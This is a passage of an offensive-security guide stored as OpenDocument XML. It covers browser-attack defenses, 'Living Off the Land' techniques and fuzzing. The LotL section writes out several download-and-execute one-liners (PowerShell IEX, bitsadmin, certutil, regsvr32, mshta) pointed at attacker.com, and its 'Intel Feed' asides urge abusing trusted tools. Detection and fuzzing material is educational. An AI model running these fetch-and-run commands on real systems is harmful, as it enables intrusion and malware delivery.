        <text:p text:style-name="P1">BeEF demonstrates the power of controlling the browser environment itself.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Remediation &amp; Defense</text:span></text:span></text:p>
        <text:list xml:id="list7578462338517028506" text:style-name="L18">
          <text:list-item>
            <text:p text:style-name="P24"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Patching:</text:span></text:span><text:span text:style-name="T1"> Keep browsers, plugins, and document readers updated. This is the </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">most critical</text:span></text:span><text:span text:style-name="T1"> defense. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P24"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Disable Unnecessary Plugins:</text:span></text:span><text:span text:style-name="T1"> Reduce the attack surface (Flash, Java applets are major historical culprits). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P24"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Script Blocking:</text:span></text:span><text:span text:style-name="T1"> Browser extensions (NoScript, uBlock Origin) can block potentially malicious JavaScript. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P24"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Email Filtering:</text:span></text:span><text:span text:style-name="T1"> Scan attachments and links for known threats. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P24"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">User Training:</text:span></text:span><text:span text:style-name="T1"> Educate users to be suspicious of unsolicited attachments/links and recognize phishing attempts. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P24"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Endpoint Security:</text:span></text:span><text:span text:style-name="T1"> Antivirus/EDR solutions can detect/block known exploits and malicious payloads. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">The client is the soft underbelly. Exploit trust and interaction. Weaponize documents, websites, emails. Browsers are complex battlegrounds; control the browser, control the user's view, steal their data, pivot into their network. Patch relentlessly. Train users vigilantly. Assume compromise.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 06: Living Off the Land (LotL) ::</text:span></text:span></text:h>
        <text:p text:style-name="P1">Sophisticated operators understand that introducing custom tools and malware increases the risk of detection. Antivirus flags known binaries, EDR systems monitor for anomalous process execution. Living Off the Land (LotL) is a philosophy and set of techniques focused on using legitimate, pre-installed system tools and capabilities for malicious purposes. Blend in with normal administrative activity. Leave fewer unique forensic footprints.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Core Principles</text:span></text:span></text:p>
        <text:list xml:id="list2246921688967441609" text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="P25"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abuse Native Tools:</text:span></text:span><text:span text:style-name="T1"> Leverage utilities built into the operating system (Windows, Linux, macOS). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P25"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Minimize External Binaries:</text:span></text:span><text:span text:style-name="T1"> Avoid dropping custom executables onto the target system whenever possible. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P25"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Scripting Languages:</text:span></text:span><text:span text:style-name="T1"> Utilize built-in scripting environments (PowerShell, Bash, Python if present) which offer powerful capabilities without needing compilation. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P25"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">In-Memory Execution:</text:span></text:span><text:span text:style-name="T1"> Execute payloads directly in memory, avoiding disk writes that trigger AV scans. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Key Windows LotL Tools &amp; Techniques</text:span></text:span></text:p>
        <text:list xml:id="list61955707327620148" text:style-name="L20">
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">PowerShell:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Ubiquitous:</text:span></text:span><text:span text:style-name="T1"> Present on all modern Windows versions. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Powerful:</text:span></text:span><text:span text:style-name="T1"> Full .NET framework access, extensive cmdlets for system administration, network communication, WMI interaction, registry manipulation, Active Directory querying. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Fileless Execution:</text:span></text:span><text:span text:style-name="T1"> Scripts can be downloaded and executed directly in memory (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')</text:span></text:span><text:span text:style-name="T1">). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Obfuscation:</text:span></text:span><text:span text:style-name="T1"> Numerous techniques (encoding, string manipulation, token replacement) exist to hide malicious PowerShell code (e.g., </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">Invoke-Obfuscation</text:span></text:span><text:span text:style-name="T1"> framework). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Frameworks:</text:span></text:span><text:span text:style-name="T1"> Entire post-exploitation frameworks built in PowerShell (e.g., PowerSploit, Empire - though less maintained now, concepts remain relevant). Used for reconnaissance, privilege escalation, persistence, credential theft, lateral movement. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">WMI (Windows Management Instrumentation):</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Purpose:</text:span></text:span><text:span text:style-name="T1"> Standard interface for managing devices and applications in a Windows network. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abuse:</text:span></text:span><text:span text:style-name="T1"> Can be used remotely (if firewall permits) or locally to execute </text:span><text:soft-page-break/><text:span text:style-name="T1">commands (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">wmic process call create "cmd.exe /c..."</text:span></text:span><text:span text:style-name="T1">), query system information, establish persistence (WMI event subscriptions), and move laterally. Often less monitored than PowerShell. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Bitsadmin:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Purpose:</text:span></text:span><text:span text:style-name="T1"> Command-line tool for managing Background Intelligent Transfer Service (BITS) jobs (used for Windows updates, etc.). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abuse:</text:span></text:span><text:span text:style-name="T1"> Can be used to download malicious files from attacker-controlled servers (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\payload.exe</text:span></text:span><text:span text:style-name="T1">), potentially bypassing some network filters. Can also be used for persistence. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Certutil:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Purpose:</text:span></text:span><text:span text:style-name="T1"> Command-line program for managing certificates. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abuse:</text:span></text:span><text:span text:style-name="T1"> Has encoding/decoding functions (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">certutil -encode</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">certutil -decode</text:span></text:span><text:span text:style-name="T1">). Can download files from URLs (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe</text:span></text:span><text:span text:style-name="T1">). Often allowlisted by application controls as it's a legitimate Windows binary. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Regsvr32:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Purpose:</text:span></text:span><text:span text:style-name="T1"> Command-line tool for registering/unregistering DLLs and ActiveX controls. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abuse:</text:span></text:span><text:span text:style-name="T1"> Can execute remote scripts (SCT files) hosted on attacker servers (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll</text:span></text:span><text:span text:style-name="T1">), bypassing some application whitelisting. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Mshta:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Purpose:</text:span></text:span><text:span text:style-name="T1"> Executes Microsoft HTML Applications (HTA files). </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abuse:</text:span></text:span><text:span text:style-name="T1"> Can run remote HTA files containing malicious VBScript/JScript (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">mshta http://attacker.com/payload.hta</text:span></text:span><text:span text:style-name="T1">), another method to bypass application controls using a trusted Microsoft binary. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Netsh:</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
            <text:list>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Purpose:</text:span></text:span><text:span text:style-name="T1"> Command-line utility for configuring network settings. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Abuse:</text:span></text:span><text:span text:style-name="T1"> Can configure port forwarding/proxying to pivot through compromised hosts (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">netsh interface portproxy add v4tov4...</text:span></text:span><text:span text:style-name="T1">). Can modify firewall rules. </text:span></text:p>
              </text:list-item>
            </text:list>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Standard Command-Line Tools:</text:span></text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">net user</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">net group</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">net share</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">tasklist</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">taskkill</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">schtasks</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ipconfig</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">route</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">arp</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">type</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">copy</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">move</text:span></text:span><text:span text:style-name="T1">. Essential for basic reconnaissance, persistence, and manipulation. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Key Linux/macOS LotL Tools &amp; Techniques</text:span></text:span></text:p>
        <text:list xml:id="list5674139089966878194" text:style-name="L21">
          <text:list-item>
            <text:p text:style-name="P27"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Shells (Bash, Zsh, etc.):</text:span></text:span><text:span text:style-name="T1"> Powerful scripting, process control, network interaction (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">curl</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">wget</text:span></text:span><text:span text:style-name="T1">), file manipulation. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P27"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Python/Perl/Ruby:</text:span></text:span><text:span text:style-name="T1"> Often pre-installed, providing extensive libraries for complex tasks without needing compilation. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P27"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">SSH:</text:span></text:span><text:span text:style-name="T1"> Secure remote login, command execution, port forwarding (pivoting). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P27"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Cron:</text:span></text:span><text:span text:style-name="T1"> Scheduling tasks for persistence. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P27"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Standard Utilities:</text:span></text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ls</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">cd</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">pwd</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ps</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">kill</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">cat</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">grep</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">sed</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">awk</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">find</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">tar</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">gzip</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ip</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ss</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">ifconfig</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">route</text:span></text:span><text:span text:style-name="T1">. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Challenges &amp; Detection</text:span></text:span></text:p>
        <text:list xml:id="list3331374607595977371" text:style-name="L22">
          <text:list-item>
            <text:p text:style-name="P28"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Logging:</text:span></text:span><text:span text:style-name="T1"> While LotL avoids dropping unique </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">binaries</text:span></text:span><text:span text:style-name="T1">, the execution of these legitimate tools for malicious purposes often creates anomalous log entries (e.g., PowerShell execution policy changes, unusual </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">wmic</text:span></text:span><text:span text:style-name="T1"> or </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">bitsadmin</text:span></text:span><text:span text:style-name="T1"> activity, unexpected network connections from system tools). Robust command-line logging and endpoint monitoring are key for detection. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P28"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Behavioral Analysis:</text:span></text:span><text:span text:style-name="T1"> EDR solutions focus on detecting </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">how</text:span></text:span><text:span text:style-name="T1"> tools are used, not just </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">which</text:span></text:span><text:span text:style-name="T1"> tools are used. PowerShell script block logging, WMI activity monitoring, and process ancestry tracking can reveal LotL techniques. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P28"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Skill Requirement:</text:span></text:span><text:span text:style-name="T1"> Effective LotL requires deep knowledge of the target OS and its built-in capabilities. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P40">:: Intel Feed ::</text:p>
        <text:p text:style-name="P40">Blend into the background noise. The system itself is your arsenal. Native tools are trusted; abuse that trust. Why deploy custom malware when PowerShell or Bash grants you the keys? Master the operating system's own language to command it silently. Detection shifts from finding rogue files to spotting legitimate tools used illegitimately.</text:p>
        <text:p text:style-name="Horizontal_20_Line"/>
        <text:h text:style-name="P41" text:outline-level="2"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">:: Sector 07: Fuzzing - Stress-Testing the Interface ::</text:span></text:span></text:h>
        <text:p text:style-name="P1">Exploits target known flaws. But what about the unknown? Fuzzing, or Fuzz Testing, is an automated software testing technique designed to discover vulnerabilities by bombarding an application with invalid, unexpected, or random data (the "fuzz") and monitoring for crashes, exceptions, or other anomalous behavior.</text:p>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Concept</text:span></text:span></text:p>
        <text:p text:style-name="P1">Instead of carefully crafted inputs designed for known vulnerabilities, fuzzing uses malformed or semi-malformed data targeting input parsers, protocol handlers, and file format processors. The goal is to trigger edge cases and error conditions that developers may not have anticipated, potentially revealing flaws like:</text:p>
        <text:list xml:id="list478047356475405232" text:style-name="L23">
          <text:list-item>
            <text:p text:style-name="P29"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Buffer Overflows:</text:span></text:span><text:span text:style-name="T1"> Sending excessively long strings. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P29"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Integer Overflows:</text:span></text:span><text:span text:style-name="T1"> Providing numeric values outside expected ranges. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P29"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Format String Bugs:</text:span></text:span><text:span text:style-name="T1"> Injecting formatting characters (</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">%s</text:span></text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">%x</text:span></text:span><text:span text:style-name="T1">) into input processed by functions like </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">printf</text:span></text:span><text:span text:style-name="T1">. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P29"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Memory Leaks/Corruption:</text:span></text:span><text:span text:style-name="T1"> Caused by improper handling of malformed data structures. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P29"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Unhandled Exceptions/Crashes:</text:span></text:span><text:span text:style-name="T1"> Indicating potential denial-of-service or exploitable conditions. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Fuzzing Targets</text:span></text:span></text:p>
        <text:list xml:id="list3899941177969796366" text:style-name="L24">
          <text:list-item>
            <text:p text:style-name="P30"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Network Protocols:</text:span></text:span><text:span text:style-name="T1"> Sending malformed packets to network services (HTTP, FTP, SMB, SMTP, DNS, custom protocols). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P30"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">File Formats:</text:span></text:span><text:span text:style-name="T1"> Feeding applications (document readers, media players, image viewers) with corrupted or maliciously crafted files (PDF, DOC, JPG, MP4). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P30"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">APIs/Web Services:</text:span></text:span><text:span text:style-name="T1"> Sending malformed requests (XML, JSON, HTTP parameters) to web applications or service endpoints. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P30"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Command-Line Arguments:</text:span></text:span><text:span text:style-name="T1"> Providing unexpected inputs to programs run from the shell. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Types of Fuzzers</text:span></text:span></text:p>
        <text:list xml:id="list7279620622051617362" text:style-name="L25">
          <text:list-item>
            <text:p text:style-name="P31"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Dumb Fuzzers (Mutation-Based):</text:span></text:span><text:span text:style-name="T1"> Take valid data samples (e.g., a valid PNG file, a standard HTTP request) and randomly modify (mutate) them – bit flipping, replacing bytes, adding/removing data. Simple to implement but often inefficient, as many mutations won't reach deep code paths. Example: Radamsa. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P31"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Smart Fuzzers (Generation-Based):</text:span></text:span><text:span text:style-name="T1"> Understand the structure or grammar of the input format (e.g., the specification for HTTP requests, the structure of a PDF file). Generate fuzz data based on this model, creating inputs that are more likely to be syntactically valid enough to pass initial parsing stages but contain malformed elements targeting deeper logic. Requires defining the protocol/format. Example: Peach Fuzzer (requires defining "Pits"). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P31"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Evolutionary Fuzzers (Coverage-Guided):</text:span></text:span><text:span text:style-name="T1"> Instrument the target application to track code coverage. Start with seed inputs, mutate them, and observe if the mutation executes new code paths in the target. Inputs that trigger new coverage are kept and further mutated, guiding the fuzzer towards exploring more of the application's logic. Highly effective but requires instrumentation (often source code access or binary instrumentation). Example: American Fuzzy Lop (AFL++). </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Fuzzing Process</text:span></text:span></text:p>
        <text:list xml:id="list501455480417817152" text:style-name="L26">
          <text:list-item>
            <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Target Identification:</text:span></text:span><text:span text:style-name="T1"> Select the application/protocol/file format. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Input Generation/Seed Selection:</text:span></text:span><text:span text:style-name="T1"> Create or obtain sample valid inputs (for mutation) </text:span><text:soft-page-break/><text:span text:style-name="T1">or define the input model (for generation). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Fuzzing Execution:</text:span></text:span><text:span text:style-name="T1"> Run the fuzzer, automatically sending generated test cases to the target. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Monitoring:</text:span></text:span><text:span text:style-name="T1"> Observe the target application for crashes, hangs, errors, or unusual resource consumption. Instrumentation (like AddressSanitizer - ASan) helps detect subtle memory corruption bugs. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Analysis:</text:span></text:span><text:span text:style-name="T1"> If a crash occurs, analyze the crashing input ("test case") and system state (core dump, logs) to understand the triggered vulnerability. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P32"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Triage/Exploitation:</text:span></text:span><text:span text:style-name="T1"> Determine if the identified crash represents an exploitable security vulnerability. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Tools</text:span></text:span></text:p>
        <text:list xml:id="list4404550085917244625" text:style-name="L27">
          <text:list-item>
            <text:p text:style-name="P33"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Network Protocol Fuzzers:</text:span></text:span><text:span text:style-name="T1"> Peach Fuzzer, Sulley (and its fork Boofuzz), sfuzz (part of Spike Fuzzer suite), Mutiny Fuzzer. Often require defining the protocol structure (e.g., Peach Pits). </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P33"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">File Format Fuzzers:</text:span></text:span><text:span text:style-name="T1"> AFL++ (American Fuzzy Lop - highly effective coverage-guided), honggfuzz, WinAFL (AFL for Windows binaries). Often require sample files as seeds. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P33"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Web Fuzzers:</text:span></text:span><text:span text:style-name="T1"> Burp Suite Intruder, OWASP ZAP Fuzzer, wfuzz, ffuf. Target HTTP parameters, headers, paths. </text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Challenges</text:span></text:span></text:p>
        <text:list xml:id="list2153672793854395052" text:style-name="L28">
          <text:list-item>
            <text:p text:style-name="P34"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Time-Consuming:</text:span></text:span><text:span text:style-name="T1"> Effective fuzzing can require millions or billions of test cases, running for hours, days, or weeks. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P34"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Crash Triage:</text:span></text:span><text:span text:style-name="T1"> Identifying which crashes represent actual, exploitable vulnerabilities requires significant analysis and debugging skills. Many crashes are simple DoS conditions. </text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P34"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Environment Setup:</text:span></text:span><text:span text:style-name="T1"> Requires careful setup of the target application, monitoring tools, and potentially instrumentation. </text:span></text:p>
          </text:list-item>
          <text:list-item>
